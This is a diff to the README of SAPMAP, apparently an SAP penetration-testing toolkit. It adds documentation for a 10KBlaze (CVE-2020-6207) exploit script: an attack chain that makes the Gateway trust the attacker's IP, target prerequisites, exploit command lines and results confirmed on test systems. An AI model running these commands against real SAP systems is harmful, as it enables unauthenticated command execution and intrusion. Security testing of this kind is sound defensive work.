@@ -131,6 +131,7 @@ sapmap.py                    Entry point — CLI args, server launch, state mana
 
 ```
 sap_gw_xpg_standalone.py    Gateway SAPXPG exploit — raw SAP NI protocol (stdlib only)
+sap_ms_betrusted.py          10KBlaze betrusted — MS registration + NILIST IP injection (stdlib only)
 sap_rfc_system_info.py       Unauthenticated RFC_SYSTEM_INFO retrieval with SAProuter support
 sap_client_enum.py           DIAG protocol client enumeration (stdlib only)
 sap_rfc_ctypes.py            RFC connection library — ctypes wrapper for SAP NW RFC SDK
@@ -344,16 +345,40 @@ Tests 16 well-known default SAP credentials via DIAG protocol (dispatcher port 3
 
 ## Exploitation
 
-### Gateway SAPXPG Exploit (Unauthenticated)
+### Gateway SAPXPG Exploit (Unauthenticated) — 10KBlaze / CVE-2020-6207
 
-The 10KBLAZE technique exploits unprotected SAP Gateway access to execute OS commands via the SAPXPG external program interface:
+The 10KBLAZE technique exploits the unauthenticated SAP Message Server internal port to register a fake application server, which injects the attacker's IP into the SAP Gateway's trusted host list. Once trusted as "internal", the attacker can execute OS commands via the SAPXPG external program interface without authentication.
+
+**Attack chain:**
 
 ```
-P1: GW_NORMAL_CLIENT    → Register with SAP Gateway
-P2: F_SAP_INIT          → Start SAPXPG conversation
-P3: SAPXPG_START_XPG    → Execute OS command
-P4: SAPXPG_END_XPG      → Retrieve command output
+1. betrusted    → Register fake app server with MS (port 39XX)
+2. NILIST reply → MS propagates attacker IP to GW trust list
+3. SAPXPG P1    → GW_NORMAL_CLIENT registration
+4. SAPXPG P2    → F_SAP_INIT (now trusted as "internal")
+5. SAPXPG P3    → SAPXPG_START_XPG — execute OS command
+6. SAPXPG P4    → SAPXPG_END_XPG — retrieve command output
 ```
+
+**Prerequisites on the target system:**
+
+| Requirement | Detail |
+|---|---|
+| MS ACL | `HOST=*` in `ms_acl_info` (or at least allows attacker IP to register) |
+| MS internal port | Port `39XX` (XX = instance number + 1 for ASCS) must be reachable through any firewall |
+| `system/secure_communication` | Must be `OFF` (default) — when `ON`, the MS requires SNC for internal connections |
+| `gw/reg_no_conn_info` | Must be `0` — controls whether the GW accepts NILIST trust propagation from registered servers. Default is `1` (blocked) on hardened systems (SAP Note 2408073) |
+| Gateway secinfo ACL | Must allow `USER-HOST=internal` traffic (the 3 default rules suffice: `P USER=* USER-HOST=internal HOST=local TP=*`) |
+
+> **Note:** The auto-derived server name preserves dots in the IP address (e.g. `192.168.2.210_S4H_00_a3f5`) so that SAP's `gethostbyname()` resolves the IP directly — no `/etc/hosts` modification is needed on the target. However, systems that had a failed reverse DNS lookup cached (NiHLGetNodeAddr) before the hosts file was updated will need a full instance restart to clear the cache.
+
+**Confirmed working on:**
+
+| System | Kernel | OS | Result |
+|---|---|---|---|
+| S4H | 793 | Linux | `uid=1001(s4hadm)` |
+| TWT | 753 | Windows | `twtestenv1\sapservicetwt` |
+| W74 | 742 | Windows | `winwas740\sapservicew74` |
 
 SAPMAP uses this to run SQL commands that create a user directly in the database:
 
@@ -537,6 +562,29 @@ Decrypted entries are categorised and colour-coded in the UI:
 
 Each standalone tool works independently with no external dependencies (Python 3 stdlib only).
 
+### sap_ms_betrusted.py
+
+10KBlaze betrusted exploit — register a fake application server with the SAP Message Server to inject the attacker's IP into the Gateway's trusted host list:
+
+```bash
+# Check if MS internal port is unprotected (CVE-2020-6207)
+python3 sap_ms_betrusted.py check-acl -t 192.168.1.100 -n 0
+
+# Run the betrusted attack (inject attacker IP as trusted)
+python3 sap_ms_betrusted.py exploit \
+    -t 192.168.1.100 -p 3901 -n 0 \
+    -a 192.168.2.210 \
+    --dp-version 14 -v
+
+# For older kernels (742): use dp-version 11
+python3 sap_ms_betrusted.py exploit \
+    -t 192.168.1.100 -p 3941 -n 40 \
+    -a 192.168.2.210 \
+    --dp-version 11 --old-kernel -v
+```
+
+After betrusted injects trust, use `sap_gw_xpg_standalone.py` to execute commands via the gateway. The betrusted connection must stay open while running SAPXPG (trust is revoked on disconnect).
+
 ### sap_gw_xpg_standalone.py
 
 Gateway SAPXPG command execution:
@@ -594,7 +642,7 @@ Separate from session state, these persist across sessions:
 
 ## Testing
 
-SAPMAP includes a unit test suite (62 tests) that validates core logic without network access:
+SAPMAP includes a unit test suite (405 tests) that validates core logic without network access:
 
 ```bash
 python3 -m pytest tests/ -v
@@ -602,11 +650,15 @@ python3 -m pytest tests/ -v
 
 | Test File | Tests | Coverage |
 |-----------|-------|----------|
+| `test_ms_betrusted.py` | 114 | MS header build/parse, LOGIN/LOGOUT/MOD_STATE, ADM records, DP info, NILIST reply, opcode parsing |
+| `test_10kblaze.py` | 42 | P1 lu_name fix, app-server name derivation, DP versions, NILIST IP reply, hostname extraction |
+| `test_10kblaze_extended.py` | 57 | MS_CHANGE_IP, MS_SET_LOGON, GWMON reply, old NILIST body, NI framing, GW sub-structures |
 | `test_secstore_decrypt.py` | 25 | RSECTAB decryption, keyprime derivation, IDENT categorisation, SSFS key extraction |
 | `test_rsec_cipher.py` | 11 | RSECCipher encode/decode roundtrip, rsec_decrypt, rsec_decrypt_key |
+| `test_gw_protocol.py` | 12 | P1/P2 packet building, parse_response, hexdump, TLV encoding, SAPRFXPG |
 | `test_models.py` | 9 | Data model serialization, risk_level, best_credentials, state management |
-| `test_gw_protocol.py` | 9 | P1/P2 packet building, parse_response, hexdump, TLV encoding |
 | `test_config.py` | 8 | Username generation, DB type normalization, SQL generators |
+| Other tests | ~127 | Router, shell, scanner configuration |
 
 ---
 
